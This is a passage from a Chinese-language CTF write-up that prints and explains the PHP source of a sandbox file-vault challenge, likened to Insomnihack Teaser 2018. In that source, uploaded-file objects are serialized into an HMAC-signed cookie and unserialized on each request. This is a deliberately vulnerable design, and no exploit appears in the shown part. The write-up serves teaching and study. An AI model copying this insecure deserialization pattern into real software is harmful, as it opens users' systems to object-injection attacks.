    <span class="token keyword">return</span> <span class="token variable">$b</span><span class="token punctuation">.</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">myunserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">UploadFile</span> <span class="token punctuation">{</span>

    <span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$fakename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">global</span> <span class="token variable">$sandbox_dir</span><span class="token punctuation">;</span>
        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$fakename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string">'.txt'</span><span class="token punctuation">;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$sandbox_dir</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fakename</span> <span class="token operator">=</span> <span class="token variable">$fakename</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">realname</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$fakename</span><span class="token punctuation">,</span> <span class="token variable">$realname</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">global</span> <span class="token variable">$sandbox_dir</span><span class="token punctuation">;</span>
        <span class="token variable">$analysis</span> <span class="token operator">=</span> <span class="token string">"$fakename is in folder $sandbox_dir/$realname."</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$analysis</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox_dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox_dir</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$sandbox_dir</span><span class="token punctuation">.</span><span class="token string">'/.htaccess'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$sandbox_dir</span><span class="token punctuation">.</span><span class="token string">'/.htaccess'</span><span class="token punctuation">,</span> <span class="token string">"php_flag engine off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'home'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'files'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'files'</span><span class="token punctuation">,</span> <span class="token function">myserialize</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'files'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">myserialize</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token string">'home'</span><span class="token punctuation">:</span>
    <span class="token keyword">default</span><span class="token punctuation">:</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"&lt;form method='post' action='index.php?action=upload' enctype='multipart/form-data'>&lt;input type='file' name='file'>&lt;input type='submit'/>&lt;/form>"</span><span class="token punctuation">;</span>

        <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">myunserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'files'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$files</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"&lt;ul>"</span><span class="token punctuation">;</span>
            <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"&lt;li>&lt;form method='POST' action='index.php?action=changename&amp;i="</span><span class="token punctuation">.</span><span class="token variable">$i</span><span class="token punctuation">.</span><span class="token string">"'>&lt;input type='text' name='newname' value='"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span>fakename<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"'>&lt;input type='submit' value='Click to edit name'>&lt;/form>&lt;a href='index.php?action=open&amp;i="</span><span class="token punctuation">.</span><span class="token variable">$i</span><span class="token punctuation">.</span>"<span class="token string">' target='</span>_blank'<span class="token operator">></span>Click to show locations<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">;</span>
                <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"&lt;/ul>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token string">'upload'</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$uploadfile</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UploadFile</span><span class="token punctuation">;</span>
                <span class="token variable">$uploadfile</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">myunserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'files'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$uploadfile</span><span class="token punctuation">;</span>
                <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'files'</span><span class="token punctuation">,</span> <span class="token function">myserialize</span><span class="token punctuation">(</span><span class="token variable">$files</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: index.php?action=home"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                exit<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token string">'changename'</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">myunserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'files'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'newname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fakename</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'newname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'files'</span><span class="token punctuation">,</span> <span class="token function">myserialize</span><span class="token punctuation">(</span><span class="token variable">$files</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: index.php?action=home"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        exit<span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token string">'open'</span><span class="token punctuation">:</span>
        <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">myunserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'files'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fakename</span><span class="token punctuation">,</span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">realname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        exit<span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token string">'reset'</span><span class="token punctuation">:</span>
        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'files'</span><span class="token punctuation">,</span> <span class="token function">myserialize</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'files'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">myserialize</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string">'unlink'</span><span class="token punctuation">,</span> <span class="token function">glob</span><span class="token punctuation">(</span><span class="token string">"$sandbox_dir/*"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: index.php?action=home"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>查看源码，发现该题目基本类似于<a href="https://link.jianshu.com/?t=https%3A%2F%2Fcorb3nik.github.io%2Fblog%2Finsomnihack-teaser-2018%2Ffile-vault" target="_blank" rel="noopener">Insomnihack Teaser 2018</a></p>
<p>该题是一个沙盒文件管理器，允许用户上传文件，同时还允许查看文件的元数据。</p>
<p>文件上传通过cookie来保存上传的文件信息。$_COOKIE[‘files’]的值是个反序列化的数组，数组的每个元素是一个UploadFile对象，保存了一个fakename（上传文件的原始名字，可以修改）和一个realname（内容hash值）。</p>
<p>用户可以进行下面五类操作：</p>
<ul>
<li>主页/home: （查看主页）通过反序列化cookie的值获得上传文件列表，然后显示在前端页面</li>
</ul>
<pre class="line-numbers language-php"><code class="language-php">    <span class="token keyword">case</span> <span class="token string">'home'</span><span class="token punctuation">:</span>
    <span class="token keyword">default</span><span class="token punctuation">:</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"&lt;form method='post' action='index.php?action=upload' enctype='multipart/form-data'>&lt;input type='file' name='file'>&lt;input type='submit'/>&lt;/form>"</span><span class="token punctuation">;</span>

        <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">myunserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'files'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$files</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"&lt;ul>"</span><span class="token punctuation">;</span>
            <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"&lt;li>&lt;form method='POST' action='index.php?action=changename&amp;i="</span><span class="token punctuation">.</span><span class="token variable">$i</span><span class="token punctuation">.</span><span class="token string">"'>&lt;input type='text' name='newname' value='"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span>fakename<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"'>&lt;input type='submit' value='Click to edit name'>&lt;/form>&lt;a href='index.php?action=open&amp;i="</span><span class="token punctuation">.</span><span class="token variable">$i</span><span class="token punctuation">.</span>"<span class="token string">' target='</span>_blank'<span class="token operator">></span>Click to show locations<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">;</span>
                <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"&lt;/ul>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>默认显示上传界面，随后反序列化Cookie存储<code>files</code>数组的<code>UploadFile</code>对象，遍历显示上传的文件。</p>
<ul>
<li>上传/upload: （上传新文件）创建对象<code>UploadFile</code>保存上传文件，无过滤</li>
</ul>
<pre class="line-numbers language-php"><code class="language-php">    <span class="token keyword">case</span> <span class="token string">'upload'</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$uploadfile</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UploadFile</span><span class="token punctuation">;</span>
                <span class="token variable">$uploadfile</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">myunserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'files'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$uploadfile</span><span class="token punctuation">;</span>
                <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'files'</span><span class="token punctuation">,</span> <span class="token function">myserialize</span><span class="token punctuation">(</span><span class="token variable">$files</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: index.php?action=home"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                exit<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>创建<code>UploadFile</code>对象，调用<code>upload</code>方法，传入文件名、文件内容在服务器上进行存储，然后反序列化cookie的files对新创建的文件<code>uploadfile</code>对象进行追加存储，之后重新设置cookie重新序列化files。</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">UploadFile</span> <span class="token punctuation">{</span>

    <span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$fakename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">global</span> <span class="token variable">$sandbox_dir</span><span class="token punctuation">;</span>
        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$fakename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string">'.txt'</span><span class="token punctuation">;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$sandbox_dir</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fakename</span> <span class="token operator">=</span> <span class="token variable">$fakename</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">realname</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$fakename</span><span class="token punctuation">,</span> <span class="token variable">$realname</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">global</span> <span class="token variable">$sandbox_dir</span><span class="token punctuation">;</span>
        <span class="token variable">$analysis</span> <span class="token operator">=</span> <span class="token string">"$fakename is in folder $sandbox_dir/$realname."</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$analysis</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>更改名称/changename:（重命名已上传的文件）修改某个已上传文件的fakename，然后重新序列化</li>
</ul>
<pre class="line-numbers language-php"><code class="language-php">    <span class="token keyword">case</span> <span class="token string">'changename'</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">myunserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'files'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'newname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
